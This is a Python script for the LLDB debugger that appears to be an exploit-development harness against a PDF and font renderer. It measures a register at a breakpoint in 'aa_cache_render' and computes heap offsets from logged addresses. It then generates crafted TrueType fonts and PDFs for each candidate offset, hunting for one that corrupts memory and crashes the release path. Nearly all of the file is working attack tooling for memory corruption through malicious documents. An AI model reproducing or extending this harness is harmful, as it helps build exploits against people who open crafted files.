# RIP-5 relay tracer: per-attempt x27 measure -> candidate compute -> strike grid -> release forensics
import os, sys, struct, subprocess, re
import lldb

def out(s):
    print(s); sys.stdout.flush()

t = lldb.debugger.GetSelectedTarget()
if not t or not t.IsValid():
    out("[rip5] no target"); sys.exit(1)
CWD = os.getcwd()
LOG = os.path.join(CWD, "rip5log.txt")
TRACE = open(os.path.join(CWD, "rip5_trace.txt"), "a")
def T(s):
    out(s); TRACE.write(s + "\n"); TRACE.flush()

sys.path.insert(0, CWD)
VENVPY = os.path.join(CWD, "venv/bin/python")

def build_font(path, L):
    subprocess.run([VENVPY, "-c",
        "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('%s', %d)" % (path, L)],
        cwd=CWD, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def gen_pdf(pdf, ttf):
    subprocess.run([VENVPY, "gen_pdf.py", pdf, ttf], cwd=CWD, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def launch(pdf, tag, ndps):
    import time
    p = t.LaunchSimple([pdf, "o_%s.png" % tag, str(ndps), tag], None, CWD)
    if not p or not p.IsValid():
        T("[rip5] launch failed"); return None
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning and time.time() - t0 < 120:
        time.sleep(0.2); st = p.GetState()
    rc = p.GetExitStatus() if st == lldb.eStateExited else -1
    return rc

def measure_x27(tag):
    """one-shot entry + walk bp dance; returns x27 or None"""
    p = t.GetProcess()
    th = p.GetSelectedThread()
    bpe = t.BreakpointCreateByName("aa_cache_render")
    bpe.SetOneShot(True)
    p.Continue()
    if p.GetState() != lldb.eStateStopped:
        return None
    fr = th.GetSelectedFrame()
    pc = fr.GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804)
    p.Continue()
    x27 = None
    if p.GetState() == lldb.eStateStopped:
        v = th.GetSelectedFrame().FindRegister("x27")
        x27 = v.GetValueAsUnsigned()
    t.BreakpointDelete(bpe.GetID()); t.BreakpointDelete(bpw.GetID())
    p.Continue()
    while p.GetState() == lldb.eStateRunning:
        import time; time.sleep(0.2)
    return x27

def parse_log(tag):
    txt = open(LOG, errors="replace").read()
    sec = txt.split("=== attempt %s " % tag, 1)
    if len(sec) < 2: return {}
    body = sec[1]
    d = {"addrs": [], "changed": [], "rel": [], "done": "[%s DONE]" % tag in body}
    m = re.search(r"\[%s ADDRS\]((?: \d+:0x[0-9a-f]+)+)" % tag, body)
    if m:
        d["addrs"] = [(int(a.split(":")[0]), int(a.split(":")[1], 16)) for a in m.group(1).split()]
    d["changed"] = re.findall(r"\[%s CHANGED\] dp(\d+) \+(0x[0-9a-f]+): ([0-9a-f]+) -> ([0-9a-f]+)" % tag, body)
    d["rel"] = [int(x) for x in re.findall(r"\[%s REL\] (\d+)" % tag, body)]
    m = re.search(r"\[%s\] diff-done changed=(\d+)" % tag, body)
    d["nchg"] = int(m.group(1)) if m else -1
    m = re.search(r"\[%s\] decode-done img=(0x[0-9a-f]+)" % tag, body)
    d["decoded"] = bool(m)
    return d

# ---------- probe attempt ----------
open(LOG, "w").close()
T("[rip5] === probe attempt ===")
rc = launch("k2_e64.pdf", "p0", 512)
x27 = measure_x27("p0m")
T("[rip5] probe rc=%s x27=%s" % (rc, hex(x27) if x27 else "None"))
if not x27:
    sys.exit(0)
D = parse_log("p0")
addrs = D.get("addrs", [])
T("[rip5] dps=%d decoded=%s" % (len(addrs), D.get("decoded")))
if len(addrs) < 8:
    T("[rip5] no dps parsed"); sys.exit(0)

# candidates: (dp+0x108-x27) % 64 == 0 and |L|<=32767
cands = []
for idx, a in addrs:
    off = a + 0x108 - x27
    if off % 64 == 0 and off != 0 and abs(off // 64) <= 32767:
        cands.append((abs(off // 64), idx, off // 64, a))
cands.sort()
T("[rip5] candidates=%d (of %d dps) best: %s" % (len(cands), len(addrs),
    ["dp%d L=%d" % (c[1], c[2]) for c in cands[:6]]))

# ---------- strike grid ----------
results = []
for n, (_, dpid, L, a) in enumerate(cands[:12]):
    tag = "s%d" % n
    ttf = "k2_r%s.ttf" % tag; pdf = "k2_r%s.pdf" % tag
    build_font(ttf, L); gen_pdf(pdf, ttf)
    rc = launch(pdf, tag, 512)
    D = parse_log(tag)
    T("[rip5] %s L=%d dp=%d rc=%s decoded=%s nchg=%s changed=%s relmax=%s done=%s" % (
        tag, L, dpid, rc, D.get("decoded"), D.get("nchg"),
        D.get("changed", [])[:4], max(D["rel"]) if D.get("rel") else -1, D.get("done")))
    results.append((tag, dpid, L, rc, D))
    if D.get("changed") and not D.get("done"):
        T("[rip5] *** RELEASE-PATH CRASH WITH STRUCK DP — winner %s" % tag)
        break
    if D.get("changed"):
        T("[rip5] --- struck but survived full release — candidate %s" % tag)
TRACE.close()
